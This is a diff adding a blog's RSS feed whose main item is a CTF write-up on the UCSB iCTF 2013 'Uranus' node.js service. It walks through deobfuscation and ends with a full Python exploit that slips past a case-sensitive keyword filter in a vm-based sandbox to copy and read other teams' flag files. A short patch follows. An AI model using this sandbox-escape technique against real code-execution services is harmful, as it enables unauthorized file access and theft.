@@ -1,0 +1,750 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Gábor Molnár</title>
+    <description>Write your site description here. It will be used as your sites meta description as well!</description>
+    <link>http://gabor.molnar.es/</link>
+    <atom:link href="http://gabor.molnar.es/feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Fri, 24 Jul 2015 11:25:41 +0200</pubDate>
+    <lastBuildDate>Fri, 24 Jul 2015 11:25:41 +0200</lastBuildDate>
+    <generator>Jekyll v2.5.3</generator>
+    
+      <item>
+        <title>UCSB iCTF 2013 - The Uranus service</title>
+        <description>&lt;p&gt;The uranus service of the &lt;a href=&quot;http://ictf.cs.ucsb.edu/&quot;&gt;UCSB iCTF&lt;/a&gt; competition this year was an &lt;a href=&quot;/files/uranus.js&quot;&gt;obfuscated node.js module&lt;/a&gt;.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;h2 id=&quot;initial-exploration&quot;&gt;Initial exploration&lt;/h2&gt;
+
+&lt;p&gt;It was very easy to get it running locally (it had no external dependencies besides node.js itself) and explore the basic functionality:&lt;/p&gt;
+
+&lt;p&gt;```bash
+$ curl localhost:1337
+Welcome to Uranus!
+With the last update of our nuclear reactor we can now control critical variables of the process
+through the easyness of JavaScript. Uranus is here to proof-check your code for safety before
+you submit it directly to the reactor.&lt;/p&gt;
+
+&lt;p&gt;Use HTTP POST to submit your code.&lt;/p&gt;
+
+&lt;p&gt;$ curl -d ‘abcd’ localhost:1337
+Your JSON is malformed. Please provide the following properties: flag_id, token, code&lt;/p&gt;
+
+&lt;p&gt;$ curl -d ‘{“flag_id”: 1, “token”: 2, “code”: “console.log(1234)”}’ localhost:1337
+Your code is missing an access code to the nuclear reactor. Expected variable according to the
+documentation is “password”.
+```&lt;/p&gt;
+
+&lt;p&gt;When submitting this, the the ‘1234’ string appeared on the server’s stdout so it was obviously executing the submitted code. The error message says that a variable named password must be set:&lt;/p&gt;
+
+&lt;p&gt;```bash
+$ curl -d ‘{“flag_id”: 1, “token”:2, “code”: “var password = 5”}’ localhost:1337
+Your code is missing an access code to the nuclear reactor. Expected variable according to the
+documentation is “password”.&lt;/p&gt;
+
+&lt;p&gt;$ curl -d ‘{“flag_id”: 1, “token”:2, “code”: “var password = &quot;a&quot;”}’ localhost:1337
+Code approved. Please check your parameters carefully before deploying the code to the nuclear
+reactor.
+```&lt;/p&gt;
+
+&lt;p&gt;At this point, the service has created a file in the &lt;code&gt;submissions&lt;/code&gt; directory named &lt;code&gt;1-2&lt;/code&gt; containing the submitted code.&lt;/p&gt;
+
+&lt;p&gt;Since it was before the level 4 (the last few hours of the CTF) when we started working on this, we did not see any legitim traffic yet. Based on these experiments, it was clear that the legitim traffic should consist of code uploads. The exploit code gets the flag_id as a parameter. This identifies a certain uploaded code (except that we don’t know the token). The flag must be the password that was used when uploading the file.&lt;/p&gt;
+
+&lt;p&gt;Let’s try to read a file with the submitted code:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;
+$ curl -d &#39;{&quot;flag_id&quot;: 2, &quot;token&quot;: 3, &quot;code&quot;: &quot;console.log(require(\&quot;fs\&quot;).readFileSync(\&quot;submissions/1-2\&quot;))&quot;}&#39; localhost:1337
+Your code has runtime errors: ReferenceError: require is not defined
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;require&lt;/code&gt; is the function used to import modules in node.js and it was not available so it was not possible to import the filesystem module needed to manipulate files… After a few more trial, I decided to look at the source code to find a way to read files and send the content back to the exploit.&lt;/p&gt;
+
+&lt;h2 id=&quot;deobfuscation&quot;&gt;Deobfuscation&lt;/h2&gt;
+
+&lt;p&gt;The source code looked terribly obfuscated, but fortunately, the obfuscation &lt;em&gt;seemed&lt;/em&gt; to be easy to revert. The obfuscated code worked like this:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Fill an array with seemingly random bytes&lt;/li&gt;
+  &lt;li&gt;Do some magic&lt;/li&gt;
+  &lt;li&gt;&lt;code&gt;eval()&lt;/code&gt; the resulting string&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Replacing the &lt;code&gt;eval()&lt;/code&gt; with &lt;code&gt;console.log()&lt;/code&gt; showed the deobfuscated source code. After prettifying the resulting code:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;javascript
+var r3A8 = (function () {
+  var U8 = (function (Z8, S8) {
+    var D8 = &quot;&quot;, C8 = &#39;return &#39;, e8 = ((0x1B2, 95.) &amp;lt; (45, 92.60E1) ? (7.07E2, false) : (110., 6.2E1) &amp;gt; 0x179 ? 1 : (129, 9.4E2));
+    if (Z8.length &amp;gt; ((0x1EF, 21.) &amp;lt; (1.18E3, 14) ? (0x139, 1) : 32. &amp;gt; (23, 0xB9) ? (1.97E2, &quot;R&quot;) : (6.350E2, 97.) &amp;lt;= 0x1F9 ? (39., 12) : (31.3E1, 0x1B5)))for (var r8 = ((117., 140.) &amp;lt;= (0x18A, 138.) ? (0xA9, &quot;z&quot;) : (17., 1.71E2) &amp;lt;= (0x212, 58.) ? (147.8E1, 130) : 0x106 &amp;lt; (33., 0x226) ? (26., 13) : (0x1D2, 0xFB)); r8 &amp;gt; ((54.30E1, 0xF1) &amp;gt;= (1.5E1, 7.390E2) ? (0, 38.1E1) : (0x1F9, 0x133) &amp;gt; 79.10E1 ? (68, &#39;\n&#39;) : (133.1E1, 81) &amp;lt; 0x173 ? (22., 1) : (1.241E3, 0x41));)D8 += (e8 = (e8 ? ((76, 0x167) &amp;lt; (6.2E2, 12.93E2) ? (18.0E1, false) : (0x127, 90.80E1) &amp;lt;= 1.16E2 ? (7.96E2, 0x69) : (10.93E2, 22.8E1)) : ((0x1F8, 0x1FE) &amp;gt; (30.1E1, 124.) ? (31., true) : (37.80E1, 110.7E1)))) ? Z8.charAt(r8) : &quot;@%)eitg)(tDwn&quot;.charAt(r8--);
+    return S8 === ((49.5E1, 0x8B) &amp;gt; (61, 0x20D) ? (56.6E1, &quot;l&quot;) : (147, 106) &amp;lt;= (0x15, 131.) ? (56, null) : (109., 95.2E1)) ? [(145.5E1 &amp;gt; (4.11E2, 0x1C5) ? (0x244, null) : 14.67E2 &amp;lt;= (100, 119.) ? (75.4E1, false) : (0x16D, 106.) &amp;lt; 12. ? 0x222 : (8.64E2, 0xF5))].constructor.constructor(C8 + D8)() : S8 ^ Z8
+  })(&quot;_9(mTe.)ea e(&quot;, ((0x127, 0x216) &amp;gt; (130.6E1, 0x25) ? (2.36E2, null) : (62., 142) &amp;lt; (0x251, 72) ? (128.0E1, &#39;R&#39;) : (0x19, 90.30E1) &amp;lt; 21. ? (127, 9.5E2) : (0x4D, 9.540E2)));
+  return {J8: function (H8) {
+    var g8, R8 = ((1.414E3, 117) &amp;gt;= 70. ? (12.0E1, 0) : (73.5E1, 147.70E1) &amp;lt;= 2.5E1 ? (1.3980E3, true) : (53, 98.2E1)), W8 = ((44.6E1, 130.20E1) &amp;gt; 0x133 ? (24.6E1, 0x142CF49F580) : (12.9E1, 10.) &amp;gt;= 133. ? (107., 0x193) : (0x240, 0x4E)) &amp;gt; U8, G8;
+    for (; R8 &amp;lt; H8.length; R8++) {
+      G8 = (parseInt(H8.charAt(R8), 16)).toString((14. &amp;gt; (0x9D, 0x21D) ? (0x155, 0xCD) : (42.40E1, 141.) &amp;lt;= 76. ? (3.25E2, 42) : 132. &amp;lt; (0x62, 11.99E2) ? (94.10E1, 2) : (0x8B, 34)));
+      g8 = R8 == 0 ? G8.charAt(G8.length - 1) : g8 ^ G8.charAt(G8.length - 1)
+    }
+    return g8 ? W8 : !W8
+  }};
+})();
+var z9o2 = r3A8.J8(&quot;63&quot;) ? {&#39;p2&#39;: &quot;length&quot;, &#39;n2&#39;: &quot;fs&quot;, &#39;w4&#39;: &quot;toString&quot;, &#39;J4&#39;: &quot;-&quot;, &#39;v2&#39;: &quot;listen&quot;, &#39;R4&#39;: &quot;log&quot;, &#39;a4&#39;: &#39;uncaughtException&#39;, &#39;d2&#39;: &#39;0.0.0.0&#39;, &#39;c4&#39;: &#39;Server running at http://0.0.0.0:1337/&#39;, &#39;Q4&#39;: &quot;http&quot;, &#39;N4&#39;: &#39;text/plain&#39;, &#39;W4&#39;: &quot;createServer&quot;, &#39;Q2&#39;: {}, &#39;M4&#39;: 1337, &#39;t2&#39;: &quot;on&quot;, &#39;s4&#39;: &quot;submissions&quot;, &#39;x2&#39;: &quot;/&quot;, &#39;y2&#39;: 1, &#39;X2&#39;: 200, &#39;f2&#39;: &quot;end&quot;, &#39;l2&#39;: &quot;&quot;, &#39;A4&#39;: &quot;writeHead&quot;} : 1337;
+function handle(E, b) {
+  var k = r3A8.J8(&quot;aa2e&quot;) ? &#39;You suck\n&#39; : &#39;Welcome to Uranus!\nWith the last update of our nuclear reactor we can now control critical variables of the process through the easyness of JavaScript. Uranus is here to proof-check your code for safety before you submit it directly to the reactor. \n\nUse HTTP POST to submit your code.&#39;, V = r3A8.J8(&quot;f56&quot;) ? &quot;test&quot; : &quot;POST&quot;, s = r3A8.J8(&quot;a6cf&quot;) ? &quot;indexOf&quot; : &quot;l&quot;, c = r3A8.J8(&quot;5613&quot;) ? &quot;method&quot; : &quot;writeFileSync&quot;;
+  if (E[c][s](V) != -z9o2.y2) {
+    handlePOST(E, b);
+    return;
+  } else {
+    b[z9o2.A4](z9o2.X2, {&#39;Content-Type&#39;: z9o2.N4});
+    b[z9o2.f2](k);
+  }
+}
+function makeSandbox() {
+  delete  eval;
+  delete  Function;
+  delete  require;
+  delete  fs;
+}
+function loadSubmission(b, k) {
+  var V = r3A8.J8(&quot;81&quot;) ? &quot;No password found&quot; : &quot;token&quot;, s = r3A8.J8(&quot;c14&quot;) ? &quot;match&quot; : &quot;toString&quot;, c = r3A8.J8(&quot;5f&quot;) ? &quot;eval&quot; : &quot;readFileSync&quot;, w = r3A8.J8(&quot;ffb7&quot;) ? &#39;Server running at http://0.0.0.0:1337/&#39; : z9o2.s4, z = r3A8.J8(&quot;fb&quot;) ? &#39;Your code has runtime errors: &#39; : b + z9o2.J4 + k;
+  try {
+    var O = r3A8.J8(&quot;67cf&quot;) ? &quot;Code contains unsafe functionality.\n&quot; : ff[c](w + z9o2.x2 + z)[z9o2.w4]();
+    return O[s](/password = &quot;([0-9a-zA-Z]{16})&quot;/)[z9o2.y2];
+  } catch (E) {
+    ;
+  }
+  return V;
+}
+function test(b) {
+  var k = r3A8.J8(&quot;1b&quot;) ? &quot;k&quot; : &quot;runInThisContext&quot;, V = r3A8.J8(&quot;81e&quot;) ? &quot;vm&quot; : &quot;handlePOST&quot;, s = r3A8.J8(&quot;74&quot;) ? function (E) {
+    global = r3A8.J8(&quot;a11a&quot;) ? &quot;g&quot; : E;
+  } : false, c = r3A8.J8(&quot;33c1&quot;) ? function (E) {
+    password = r3A8.J8(&quot;77&quot;) ? &quot;loadSubmission&quot; : E;
+  } : &quot;submissions&quot;, w = r3A8.J8(&quot;d5&quot;) ? &quot;retval&quot; : require(V);
+  c(z9o2.l2);
+  s(z9o2.l2);
+  w[k](b[z9o2.w4]());
+  return password;
+}
+function storeSubmission(b, k, V) {
+  var s = r3A8.J8(&quot;ac&quot;) ? &quot;handle&quot; : &quot;writeFileSync&quot;, c = r3A8.J8(&quot;3a8&quot;) ? &quot;mkdirSync&quot; : &quot;http&quot;, w = r3A8.J8(&quot;6ef&quot;) ? &quot;statSync&quot; : &quot;err&quot;, z = z9o2.s4, O = b + z9o2.J4 + k;
+  try {
+    var Z = ff[w](z);
+  } catch (E) {
+    ;
+  }
+  if (!Z)ff[c](z);
+  ff[s](z + z9o2.x2 + O, V);
+}
+function checkCode(E) {
+  var b = r3A8.J8(&quot;61&quot;) ? true : &quot;res&quot;, k = r3A8.J8(&quot;2f7&quot;) ? &quot;test&quot; : false, V = &quot;test&quot;, s = r3A8.J8(&quot;3ae&quot;) ? ((30, 0xC4) &amp;lt; (96.5E1, 9) ? &#39;R&#39; : (105.2E1, 44.) &amp;gt;= (142, 1.183E3) ? (110, 133.70E1) : 120. &amp;gt; (53.6E1, 96) ? (0x24A, &quot;q&quot;) : (8.4E1, 1.5E1)) : &quot;writeFileSync&quot;, c = r3A8.J8(&quot;ba&quot;) ? ((9.99E2, 119.80E1) &amp;lt;= (24., 10.96E2) ? &#39;\n&#39; : 131 &amp;gt;= (0x105, 0x132) ? &#39;\n&#39; : (1.0010E3, 72) &amp;lt;= 23.90E1 ? (124., 0) : (100., 0x254)) : &quot;data&quot;, w = [/eval/, /global/, /Function/, /this/];
+  for (var z = c; A3a[s](z, w[z9o2.p2]); z++) {
+    if (w[z][V](E)) {
+      return k;
+    }
+  }
+  return b;
+}
+function handlePOST(G, A) {
+  var N = r3A8.J8(&quot;e1c&quot;) ? &quot;data&quot; : &quot;hasOwnProperty&quot;;
+  G[z9o2.t2](N, function (k) {
+    var V = &#39;Your JSON is malformed. Please provide the following properties: flag_id, token, code\n&#39;, s = &#39;Code contains unsafe functionality.\n&#39;, c = r3A8.J8(&quot;46cf&quot;) ? &#39;Your code is missing an access code to the nuclear reactor. Expected variable according to the documentation is &quot;password&quot;.\n&#39; : &quot;Received: %s&quot;, w = r3A8.J8(&quot;53&quot;) ? &#39;text/plain&#39; : &#39;Code approved. Please check your parameters carefully before deploying the code to the nuclear reactor.\n&#39;, z = r3A8.J8(&quot;555&quot;) ? &quot;U&quot; : &quot;i&quot;, O = r3A8.J8(&quot;8ccd&quot;) ? &#39;\n&#39; : true, Z = &#39;Your password: &#39;, e = &quot;code&quot;, T = &quot;token&quot;, D = r3A8.J8(&quot;2235&quot;) ? &quot;e&quot; : &quot;flag_id&quot;, J = r3A8.J8(&quot;8f&quot;) ? &quot;hasOwnProperty&quot; : &quot;hasOwnProperty&quot;, R = r3A8.J8(&quot;2fb&quot;) ? &quot;patterns&quot; : &quot;parse&quot;;
+    try {
+      data_json = JSON[R](k);
+    } catch (E) {
+      var b = function () {
+        data_json = r3A8.J8(&quot;265&quot;) ? {} : ((0x17B, 149.) &amp;gt;= (30., 0x20F) ? (12.17E2, &quot;vm&quot;) : (7.79E2, 128) &amp;lt;= 0x1A6 ? (21.90E1, 200) : (57., 53.) &amp;gt; 106.7E1 ? (7.26E2, 84.) : (11.61E2, 1.5E2));
+      };
+      b();
+    }
+    if (data_json[J](D) &amp;amp;&amp;amp; data_json[J](T)) {
+      if (!data_json[J](e)) {
+        old_password = loadSubmission(data_json[D], data_json[T]);
+        A[z9o2.A4](z9o2.X2, {&#39;Content-Type&#39;: z9o2.N4});
+        A[z9o2.f2](Z + old_password + O);
+      } else {
+        var W = r3A8.J8(&quot;d6b7&quot;) ? function (E) {
+          code = E[e];
+        } : &quot;No password found&quot;, B = function (E) {
+          password = r3A8.J8(&quot;5c78&quot;) ? &quot;retval&quot; : E;
+        };
+        B(z9o2.l2);
+        W(data_json);
+        if (checkCode(code)) {
+          try {
+            retval = r3A8.J8(&quot;c4&quot;) ? &quot;Server running at http://0.0.0.0:1337/&quot; : test(code[z9o2.w4]());
+          } catch (E) {
+            var b = r3A8.J8(&quot;b38a&quot;) ? &quot;Your password: &quot; : &#39;Your code has runtime errors: &#39;;
+            A[z9o2.A4](z9o2.X2, {&#39;Content-Type&#39;: z9o2.N4});
+            A[z9o2.f2](b + E + O);
+          }
+          try {
+            if (A3a[z](password[z9o2.p2], z9o2.y2)) {
+              storeSubmission(data_json[D], data_json[T], code);
+              A[z9o2.A4](z9o2.X2, {&#39;Content-Type&#39;: z9o2.N4});
+              A[z9o2.f2](w);
+            }
+          } catch (E) {
+            console[z9o2.R4](E);
+          }
+          A[z9o2.A4](z9o2.X2, {&#39;Content-Type&#39;: z9o2.N4});
+          A[z9o2.f2](c);
+        }
+      }
+      A[z9o2.A4](z9o2.X2, {&#39;Content-Type&#39;: z9o2.N4});
+      A[z9o2.f2](s);
+    } else {
+      A[z9o2.A4](z9o2.X2, {&#39;Content-Type&#39;: z9o2.N4});
+      A[z9o2.f2](V);
+    }
+  });
+}
+var A3a = {&#39;U&#39;: function (E, b) {
+  return E &amp;gt;= b;
+}, &#39;q&#39;: function (E, b) {
+  return E &amp;lt; b;
+}, &#39;M&#39;: {}};
+http = r3A8.J8(&quot;c534&quot;) ? &quot;submissions&quot; : require(z9o2.Q4);
+ff = r3A8.J8(&quot;6422&quot;) ? 200 : require(z9o2.n2);
+process[z9o2.t2](z9o2.a4, function (E) {
+  var b = &#39;Caught exception: &#39;;
+  console[z9o2.R4](b + E);
+});
+http[z9o2.W4](handle)[z9o2.v2](z9o2.M4, z9o2.d2);
+console[z9o2.R4](z9o2.c4)
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Looks much better right? Well, not really.&lt;/p&gt;
+
+&lt;p&gt;First, the &lt;code&gt;z9o2&lt;/code&gt; object contains primitive values and it is referenced everywhere instead of using strings and numbers directly. Code like &lt;code&gt;A[z9o2.A4](z9o2.X2, {&#39;Content-Type&#39;: z9o2.N4});&lt;/code&gt; should be translated to &lt;code&gt;A.writeHead(200, {&#39;Content-Type&#39;: &#39;text/plain&#39;})&lt;/code&gt; (&lt;code&gt;x[&#39;y&#39;]&lt;/code&gt; is equivalent to &lt;code&gt;x.y&lt;/code&gt; in JavaScript). I wrote a little node.js script to inline these:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;javascript
+var z9o2 = {&#39;p2&#39;: &quot;length&quot;, &#39;n2&#39;: &quot;fs&quot;, &#39;w4&#39;: &quot;toString&quot;, &#39;J4&#39;: &quot;-&quot;, &#39;v2&#39;: &quot;listen&quot;, &#39;R4&#39;: &quot;log&quot;,
+            &#39;a4&#39;: &#39;uncaughtException&#39;, &#39;d2&#39;: &#39;0.0.0.0&#39;,
+            &#39;c4&#39;: &#39;Server running at http://0.0.0.0:1337/&#39;, &#39;Q4&#39;: &quot;http&quot;, &#39;N4&#39;: &#39;text/plain&#39;,
+            &#39;W4&#39;: &quot;createServer&quot;, &#39;Q2&#39;: {}, &#39;M4&#39;: 1337, &#39;t2&#39;: &quot;on&quot;, &#39;s4&#39;: &quot;submissions&quot;, &#39;x2&#39;: &quot;/&quot;,
+            &#39;y2&#39;: 1, &#39;X2&#39;: 200, &#39;f2&#39;: &quot;end&quot;, &#39;l2&#39;: &quot;&quot;, &#39;A4&#39;: &quot;writeHead&quot;};
+source = require(&#39;fs&#39;).readFileSync(process.argv[2]).toString()
+for (key in z9o2) {
+    if (typeof(z9o2[key]) == &#39;number&#39;) {
+        source = source.replace(RegExp(&#39;z9o2.&#39; + key, &#39;g&#39;), z9o2[key])
+    } else {
+        source = source.replace(RegExp(&#39;\\[z9o2.&#39; + key + &#39;]&#39;, &#39;g&#39;), &quot;.&quot; + z9o2[key])
+        source = source.replace(RegExp(&#39;z9o2.&#39; + key, &#39;g&#39;), &quot;&#39;&quot; + z9o2[key] + &quot;&#39;&quot;)
+    }
+}
+console.log(source)
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Then, there are lot of conditional expressions that use the &lt;code&gt;r3A8.J8()&lt;/code&gt; function like this: &lt;code&gt;r3A8.J8(&quot;1b&quot;) ? &quot;k&quot; : &quot;runInThisContext&quot;&lt;/code&gt;. It seems to be some kind of hash function with a boolean output, since it’s a pure function without side effects. (&lt;strong&gt;Update&lt;/strong&gt;: it turned out to be this simple only for the duration of the competition since it checks the date :) For a deeper analysis of this function, see &lt;a href=&quot;http://wizardsofdos.de/blog/?p=1254096&quot;&gt;this writeup&lt;/a&gt;) I wrote another small script to resolve these:&lt;/p&gt;
+
+&lt;p&gt;```javascript
+var source = require(‘fs’).readFileSync(process.argv[2]).toString();
+var ast = require(‘esprima’).parse(source);&lt;/p&gt;
+
+&lt;p&gt;var r3A8 = (function () { /* … copied from the source file */ })();&lt;/p&gt;
+
+&lt;p&gt;traverse(ast);&lt;/p&gt;
+
+&lt;p&gt;function traverse(ast) {
+  try {
+    // Match only expressions like r3A8.J8(a) ? b : c
+    if (ast.test.callee.object.name == “r3A8” &amp;amp;&amp;amp; ast.test.callee.property.name == ‘J8’) {
+      // Resolving the conditional expression
+      var decision = r3A8.J8(ast.test.arguments[0].value);
+      var value = decision ? ast.consequent : ast.alternate;
+      for (var key in ast) delete ast[key];
+      for (key in value) ast[key] = value[key];
+      return;
+    }
+  } catch (e) {}&lt;/p&gt;
+
+&lt;p&gt;if (ast instanceof Object) {
+    for (var key in ast) traverse(ast[key]);
+  }
+}&lt;/p&gt;
+
+&lt;p&gt;var source = require(‘escodegen’).generate(ast);&lt;/p&gt;
+
+&lt;p&gt;console.log(source)
+```&lt;/p&gt;
+
+&lt;p&gt;There were a few more tricks that were only present in a few lines; those were resolved by hand. After inlining most of the variables in the resulting code (modern IDEs usually provide a shortcut to easily do that), it looks like a normal node.js program now.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-deobfuscated-code&quot;&gt;The deobfuscated code&lt;/h2&gt;
+
+&lt;p&gt;```javascript
+http = require(‘http’);
+ff = require(‘fs’);&lt;/p&gt;
+
+&lt;p&gt;function loadSubmission(flag_id, token) {
+    try {
+        var O = ff.readFileSync(‘submissions/’ + flag_id + ‘-‘ + token).toString();
+        console.log(‘dfsd ‘, O, O.match(/password = “([0-9a-zA-Z]{16})”/));
+        return O.match(/password = “([0-9a-zA-Z]{16})”/)[1];
+    } catch (E) {}
+    return ‘No password found’;
+}
+function storeSubmission(flag_id, token, code) {
+    try {
+        var Z = ff.statSync(‘submissions’);
+    } catch (E) {}
+    if (!Z) ff.mkdirSync(‘submissions’);
+    ff.writeFileSync(‘submissions/’ + flag_id + ‘-‘ + token, code);
+}&lt;/p&gt;
+
+&lt;p&gt;function test(code) {
+    password = ‘’;
+    global = ‘’;
+    require(‘vm’).runInThisContext(code.toString());
+}
+function checkCode(code) {
+    var checks = [
+            /eval/,
+            /global/,
+            /Function/,
+            /this/
+        ];
+    for (var z = 0; z &amp;lt; checks.length; z++) {
+        if (checks[z].test(code)) {
+            return false;
+        }
+    }
+    return true;
+}&lt;/p&gt;
+
+&lt;p&gt;function handlePOST(req, res) {
+    req.on(‘data’, function (k) {
+        console.log(k.toString());
+        try {
+            data_json = JSON.parse(k);
+        } catch (E) {
+            data_json = {};
+        }
+        if (data_json.hasOwnProperty(‘flag_id’) &amp;amp;&amp;amp; data_json.hasOwnProperty(‘token’)) {
+            if (!data_json.hasOwnProperty(‘code’)) {
+                old_password = loadSubmission(data_json.flag_id, data_json.token);
+                res.writeHead(200, { ‘Content-Type’: ‘text/plain’ });
+                res.end(‘Your password: ‘ + old_password + ‘\n’);
+            } else {
+                password = ‘’;
+                code = data_json[‘code’];
+                if (checkCode(code)) {
+                    try {
+                        test(code.toString());
+                    } catch (E) {
+                        res.writeHead(200, { ‘Content-Type’: ‘text/plain’ });
+                        res.end(‘Your code has runtime errors: ‘ + E + ‘\n’);
+                    }
+                    try {
+                        if (password.length &amp;gt;= 1) {
+                            storeSubmission(data_json[‘flag_id’], data_json[‘token’], code);
+                            res.writeHead(200, { ‘Content-Type’: ‘text/plain’ });
+                            res.end(‘Code approved. Please check your parameters carefully before deploying the code to the nuclear reactor.\n’);
+                        }
+                    } catch (E) {
+                        console.log(E);
+                    }
+                    res.writeHead(200, { ‘Content-Type’: ‘text/plain’ });
+                    res.end(‘Your code is missing an access code to the nuclear reactor. Expected variable according to the documentation is “password”.\n’);
+                }
+            }
+            res.writeHead(200, { ‘Content-Type’: ‘text/plain’ });
+            res.end(‘Code contains unsafe functionality.\n’);
+        } else {
+            res.writeHead(200, { ‘Content-Type’: ‘text/plain’ });
+            res.end(‘Your JSON is malformed. Please provide the following properties: flag_id, token, code\n’);
+        }
+    });
+}&lt;/p&gt;
+
+&lt;p&gt;process.on(‘uncaughtException’, function (E) {
+    console.log(‘Caught exception: ‘ + E);
+});&lt;/p&gt;
+
+&lt;p&gt;http.createServer(function handle(req, res) {
+    if (req.method.indexOf(‘POST’) != -1) {
+        handlePOST(req, res);
+    } else {
+        res.writeHead(200, { ‘Content-Type’: ‘text/plain’ });
+        res.end(‘Welcome to Uranus!\nWith the last update of our nuclear reactor we can now control critical variables of the process through the easyness of JavaScript. Uranus is here to proof-check your code for safety before you submit it directly to the reactor. \n\nUse HTTP POST to submit your code.’);
+    }
+}).listen(1337, ‘0.0.0.0’);&lt;/p&gt;
+
+&lt;p&gt;console.log(‘Server running at http://0.0.0.0:1337/’);
+```&lt;/p&gt;
+
+&lt;p&gt;The full functionality:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;If &lt;code&gt;flag_id&lt;/code&gt;, &lt;code&gt;token&lt;/code&gt; and &lt;code&gt;code&lt;/code&gt; is specified as JSON
+    &lt;ul&gt;
+      &lt;li&gt;the code is run if it passes the filter (&lt;code&gt;eval&lt;/code&gt;, &lt;code&gt;global&lt;/code&gt;, &lt;code&gt;Function&lt;/code&gt; and &lt;code&gt;this&lt;/code&gt; is not alowed)&lt;/li&gt;
+      &lt;li&gt;the code can’t use &lt;code&gt;require&lt;/code&gt; because &lt;a href=&quot;https://groups.google.com/forum/#!topic/nodejs/vFkaH8gouDU&quot;&gt;it’s not exposed by default&lt;/a&gt; when using the &lt;code&gt;vm&lt;/code&gt; module&lt;/li&gt;
+      &lt;li&gt;if it sets the variable &lt;code&gt;password&lt;/code&gt; then the code is stored in this file: &lt;code&gt;submissions/{flag_id}-{token}&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;If only &lt;code&gt;flag_id&lt;/code&gt; and &lt;code&gt;token&lt;/code&gt; is specified
+    &lt;ul&gt;
+      &lt;li&gt;the password from the &lt;code&gt;submissions/{flag_id}-{token}&lt;/code&gt; file is read and returned&lt;/li&gt;
+      &lt;li&gt;but only if the password is 16 alphanumerical character&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
+
+&lt;p&gt;Our exploit worked like this:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Upload a code,&lt;/li&gt;
+  &lt;li&gt;that finds the file associated with the flag_id&lt;/li&gt;
+  &lt;li&gt;and copies the file to a known location.&lt;/li&gt;
+  &lt;li&gt;Use the password retrieval functionality to retrieve the password from the known location.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Here’s the full exploit code:&lt;/p&gt;
+
+&lt;p&gt;```python
+import urllib2
+import json
+import re&lt;/p&gt;
+
+&lt;p&gt;class Exploit():
+    code = “””
+    fname = ff.readdirSync(‘./submissions’).filter(function(name) { return name.match(/^%s-.*/) })[0];
+    ff.writeFileSync(‘./submissions/spamandhex-1’, ff.readFileSync(‘./submissions/’ + fname));
+    “””&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;def get(self, url, flag_id, token):
+    data = json.dumps({ &quot;flag_id&quot;: flag_id, &quot;token&quot;: token })
+    return urllib2.urlopen(url=url, data=data).read()
+
+def set(self, url, flag_id, token, code):
+    data = json.dumps({ &quot;flag_id&quot;: flag_id, &quot;token&quot;: token, &quot;code&quot;: code })
+    return urllib2.urlopen(url=url, data=data).read()
+
+def execute(self, ip, port, flag_id):
+    url = &#39;http://%s:%s&#39; % (ip, port)
+    self.set(url, &#39;1234&#39;, &#39;1&#39;, Exploit.code % flag_id)
+    result = self.get(url, &#39;spamandhex&#39;, &#39;1&#39;)
+    self.flag = re.findall(&#39;Your password: (.*)&#39;, result)[0]
+
+def result(self):
+    return {&#39;FLAG&#39; : self.flag} ```
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Instead of using &lt;code&gt;require&lt;/code&gt; to access the &lt;code&gt;fs&lt;/code&gt; module, the global &lt;code&gt;ff&lt;/code&gt; variable (set by the server code) was used that holds a reference to the &lt;code&gt;fs&lt;/code&gt; module. The filter does not find the &lt;code&gt;function&lt;/code&gt; keyword because the filter was &lt;code&gt;/Function/&lt;/code&gt; and regexes are case-sensitive by default.&lt;/p&gt;
+
+&lt;p&gt;After launching our own, we also saw an exploit that abuses the fact that exceptions were reported back to the submitter. This exploit did read out the password from the appropriate file and generated an exception with the password as text.&lt;/p&gt;
+
+&lt;h2 id=&quot;patch&quot;&gt;Patch&lt;/h2&gt;
+
+&lt;p&gt;As a patch, I renamed the &lt;code&gt;ff&lt;/code&gt; variable to &lt;code&gt;fs&lt;/code&gt;, and it turned out to be enough to keep the other teams away.&lt;/p&gt;
+
+&lt;h2 id=&quot;thanks&quot;&gt;Thanks&lt;/h2&gt;
+
+&lt;p&gt;It was great fun to solve this puzzle, just as fun as the whole UCSB iCTF competition this year. Thanks to the organizers for organizing such a great competition again this year!&lt;/p&gt;
+
+</description>
+        <pubDate>Fri, 13 Dec 2013 19:43:00 +0100</pubDate>
+        <link>http://gabor.molnar.es/blog/2013/12/13/ucsb-ictf-2013-uranus/</link>
+        <guid isPermaLink="true">http://gabor.molnar.es/blog/2013/12/13/ucsb-ictf-2013-uranus/</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>GSoC - wrap up</title>
+        <description>&lt;p&gt;This year’s Google Summer of Code program has sadly come to an end. It has been a great summer for me: I’ve met fantastic people, worked on software that will hopefully be widely used in the future, and contributed to the evolving HTTP/2 standard.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;My Summer of Code project in numbers:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;2 node.js modules:
+    &lt;ul&gt;
